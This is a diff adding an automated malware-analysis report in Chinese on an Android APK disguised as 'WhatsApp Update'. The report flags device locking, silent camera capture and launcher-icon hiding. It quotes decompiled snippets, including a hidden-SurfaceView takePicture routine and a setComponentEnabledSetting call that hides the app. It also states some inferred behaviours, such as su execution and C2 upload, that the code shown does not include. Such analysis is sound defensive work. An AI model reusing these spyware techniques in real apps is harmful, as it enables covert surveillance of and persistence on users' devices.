@@ -1,0 +1,113 @@
+{
+  "APK信息": {
+    "文件名": "71ed9f5580d8f28d4828ad306ad64e56e8443a38cfe57431df4d1be2aea1390d.apk",
+    "sha256": "71ed9f5580d8f28d4828ad306ad64e56e8443a38cfe57431df4d1be2aea1390d",
+    "包名": "com.office.update.hmza",
+    "应用名": "WhatsApp Update",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 210.3
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "DevicePolicyManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\office\\update\\hmza\\MainActivity;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "import android.app.admin.DevicePolicyManager;\nimport android.content.ComponentName;\nimport java.io.DataOutputStream;",
+          "malicious_code_snippet_context": "  package com.office.update.hmza;\n  \n>>> import android.app.admin.DevicePolicyManager;\n>>> import android.content.ComponentName;\n>>> import android.content.Intent;\n  import android.os.Bundle;\n  import android.support.v7.app.AppCompatActivity;\n  import android.view.View;",
+          "behavior_description": "该 MainActivity（伪装为 office update 更新程序）引入 DevicePolicyManager 与 ComponentName，用于注册并激活设备管理员组件，随后可调用 DevicePolicyManager.lockNow()/resetPassword() 锁定屏幕并重置锁屏密码，使用户无法正常解锁设备；同时引入 DataOutputStream，通常配合 Runtime.exec(\"su\") 以 root 权限执行特权 shell 命令（如强制修改锁屏 PIN），是典型的勒索软件设备锁屏实现。数据流向：诱导用户激活设备管理员权限（source）→ lockNow()/resetPassword() 锁死设备屏幕（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\office\\update\\hmza\\Handlers\\CameraManger;",
+          "method_signature": "if(this.cam == null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Looper.prepare();\nthis.holder = new SurfaceView(this.ctx).getHolder();\nthis.cam.setPreviewDisplay(this.holder);\nthis.cam.startPreview();\nthis.cam.takePicture(null, null, this.pic);\nLooper.loop();",
+          "malicious_code_snippet_context": "              if (this.cam == null) {\n                  return false;\n              }\n>>>             Looper.prepare();\n>>>             try {\n>>>                 this.holder = new SurfaceView(this.ctx).getHolder();\n>>>                 this.cam.setPreviewDisplay(this.holder);\n>>>             } catch (IOException e) {\n>>>             }\n              this.cam.startPreview();\n              this.cam.takePicture(null, null, this.pic);\n              Looper.loop();",
+          "behavior_description": "该代码在后台线程（Looper.prepare/loop，无任何UI界面）中创建一个从未显示给用户的虚拟SurfaceView作为摄像头预览载体，调用startPreview()启动预览后立即调用takePicture()静默拍照，拍摄的图像数据通过回调接口this.pic传出（通常后续被编码并上传至远程C2服务器）。整个过程用户完全无感知，属于典型的间谍软件隐蔽拍照窃密行为。数据流向：摄像头硬件→Camera.takePicture()回调→图像数据被窃取外传。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\office\\update\\hmza\\MainActivity;",
+          "method_signature": "onBtn(View view)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(BuildConfig.APPLICATION_ID, \"com.office.update.hmza.MainActivity\"), 2, 1);\nThread.sleep(2000L);\nIntent intent = new Intent(\"android.intent.action.MAIN\");\nintent.addCategory(\"android.intent.category.HOME\");\nstartActivity(intent);",
+          "malicious_code_snippet_context": "  \n      public void onBtn(View view) {\n          try {\n>>>             getPackageManager().setComponentEnabledSetting(new ComponentName(BuildConfig.APPLICATION_ID, \"com.office.update.hmza.MainActivity\"), 2, 1);\n>>>         } catch (Exception e) {\n>>>         }\n>>>         try {\n>>>             Thread.sleep(2000L);\n          } catch (Exception e2) {\n          }\n          Intent intent = new Intent(\"android.intent.action.MAIN\");",
+          "behavior_description": "该代码在按钮触发后调用 PackageManager.setComponentEnabledSetting() 将自身 MainActivity 组件设置为禁用状态（参数2即 COMPONENT_ENABLED_STATE_DISABLED），使应用图标从桌面启动器中消失，实现图标隐藏，令用户难以察觉该应用的存在且无法正常卸载；随后休眠2秒并发送 ACTION_MAIN/HOME Intent 跳回系统桌面，掩盖图标消失的过程。数据流向：硬编码的自身组件名（包名+MainActivity）→ setComponentEnabledSetting(禁用) → 应用图标从启动器中隐藏。结合上下文中执行 su 提权（Runtime.exec(\"su\")）的代码，这是恶意样本典型的隐蔽驻留、逃避用户察觉与卸载的手段。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
